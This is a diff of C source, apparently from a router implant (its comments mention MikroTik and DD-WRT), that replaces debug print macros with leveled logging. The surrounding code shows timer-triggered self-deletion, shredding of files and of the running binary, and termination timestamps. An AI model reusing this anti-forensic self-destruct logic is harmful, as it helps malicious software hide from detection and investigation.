@@ -26,11 +26,10 @@ void check_timer(char* filepath, unsigned long delete_delay)
 
 	if ( ret < 0 )
 	{
-		D( perror( " DEBUG check_timer: stat" ); )
 		// TODO: return error, exit?
 		//Do not want to exit, this will stop the process and leave the executable...
 		//Added a self_delete, if you can't stat the file, it's gone as well as our timing information.
-		D( printf(" DEBUG check_timer: No time file exists, self_delete will occur now...\n"); )
+		DLX(1, printf("No time file exists, self_delete will occur now...\n"));
 #if defined LINUX || SOLARIS
 		markTermination((char *)sdfpl);
 #endif
@@ -50,7 +49,7 @@ void check_timer(char* filepath, unsigned long delete_delay)
 				// not reached
 			}
 		} else {
-			D( printf( " DEBUG: %s, %d: Negative time difference.\n", __FILE__, __LINE__); )
+			DLX(4, printf("Negative time difference.\n"));
 		}
 	}
 
@@ -72,18 +71,18 @@ int shred_file(char* filename)
 
 	if ( fd < 0 )
 	{
-		D( printf( "DEBUG: stat failed. file size unknown.\n" ); )
-			ret = -1;
+		DLX(1, printf( "stat of \"%s\" failed; file size unknown.\n", filename));
+		ret = -1;
 	}
 	else
 	{
-		D( printf( " DEBUG: %s is %i bytes in size.\n", filename, (int)statbuf.st_size ); )
+		DLX(1, printf( "\"%s\" is %i bytes in size.\n", filename, (int)statbuf.st_size ));
 		fd = open( (char *)filename, O_WRONLY );
 
 		if ( fd < 0 )
 		{
-			D( perror( "open" ); )
-				ret = -2;
+			DLX(1, perror( "open" ));
+			ret = -2;
 		}
 		else
 		{
@@ -111,7 +110,7 @@ int shred_file(char* filename)
         // Given prior successful testing with the MikroTik RouterOS on 
         // other hardware, remove() is expected to work.....
         // With DD-WRT, remove() fails with "can't resolve symbol 'remove'"
-        D( perror( "remove()" ); )
+        DLX(1, perror( "remove()"));
 		ret = -1;
     }
 #endif
@@ -132,10 +131,10 @@ void self_delete()
 
 	//ret = readlink( "/proc/self/exe",self, 511);
 	(void) readlink( (char*)sdp, self, 511);
-	D( printf( " DEBUG: readlink reads => %s\n", self ); )
+	DLX(3, printf("readlink reads => %s\n", self));
 
 	// shred self
-	D( printf (" DEBUG: shredding self\n" ); )
+	DLX(1, printf ("shredding self\n"));
 	shred_file(self);
 
 	if(self != NULL)
@@ -162,7 +161,7 @@ void self_delete()
 
 	// determine /path/to/running_binary
 	self = (char *)getexecname();
-	D( printf( " DEBUG: getexecname returns => %s\n", self ); )
+	DLX(1, printf("getexecname returns => %s\n", self));
 	
 	//create the script line to delete the binary on disk
 	memset(line2,0,256);
@@ -204,28 +203,26 @@ void update_file(char* filepath)
 	int ret=1234;
 	FILE* timeFile;
 	ret = utime(filepath, NULL);
-	D( printf("\n\n\n DEBUG update_file: Initial return from update_file utime = %i\n", ret); )
+	DLX(5, printf("Initial return from update_file utime = %i\n", ret));
 	if (ret != 0)
 	{
-		D( perror(" DEBUG update_file: initial update via utime failed.\n"); )
-		D( printf(" DEBUG update_file: Trying to open file %s.\n", filepath); )
+		DLX(3, perror("Initial update via utime failed."));
+                DLX(3, printf("Trying to open file %s.\n", filepath));
 		timeFile = fopen( filepath, "w");   //Create the file...
 		if (timeFile == NULL)
 		{
-			D( perror(" DEBUG update_file: Could not open via update_file.\n"); )
-			D( printf(" DEBUG update_file:  errno = %d.\n\n\n", errno); )
+			DLX(3, perror("Could not open via update_file"));
 		}
 		else
 		{
-			D( printf(" DEBUG update_file: Closing file %s.\n\n\n", filepath); )
+			DLX(3, printf("Closing file %s.", filepath));
 			fclose(timeFile);
 		}
 	}
 	else
 	{
-		D( printf(" DEBUG update_file: File %s updated correctly via utime...\n\n\n", filepath); )
+		DLX(5, printf("File %s updated correctly via utime...\n", filepath));
 	}
-
 	return; 
 }
 
@@ -239,15 +236,14 @@ void markTermination(char* filepath)
 	FILE* timeFile;
 
 	ret = utime(filepath, NULL);
-	D( printf("\n\n\n DEBUG markTermination: Initial return from update_file utime = %i\n", ret); )
+	DLX(4, printf("Initial return from update_file utime = %i\n", ret));
 	if (ret != 0)
 	{
-		D( printf(" DEBUG markTermination: Trying to open file %s.\n", filepath); )
+		DLX(4, printf("Trying to open file %s.\n", filepath));
 		timeFile = fopen( filepath, "w");   //Create the file...
 		if (timeFile == NULL)
 		{
-			D( perror(" DEBUG markTermination: Could not open via update_file.\n"); )
-			D( printf(" DEBUG markTermination:  errno = %d.\n\n\n", errno); )
+			DLX(4, perror("Could not open via update_file"));
 		}
 		else
 		{
@@ -256,18 +252,18 @@ void markTermination(char* filepath)
 			length=strftime(timeStamp, 20, "%y%m%d%H%M%S", &timestruct);
 			if (length<=0)
 			{
-				D( printf(" DEBUG markTermination: Could not create timeStamp.\n"); )
+				DLX(4, printf("Could not create timeStamp.\n"));
 			}
 			else if (length > 20)
 			{
-				D( printf(" DEBUG markTermination: illegal timeStamp will not be used.\n"); )
+				DLX(4, printf("Illegal timeStamp will not be used.\n"));
 			}
 			else
 			{
-				D( printf(" DEBUG markTermination: writing timeStamp %s to file.\n", timeStamp); )
+				DLX(4, printf("Writing timeStamp %s to file.\n", timeStamp));
 				fprintf(timeFile, "%s\n", timeStamp); 
 			}
-			D( printf(" DEBUG markTermination: Closing file %s.\n\n\n", filepath); )
+			DLX(4, printf("Closing file %s.\n", filepath));
 			fclose(timeFile);
 		}
 	}
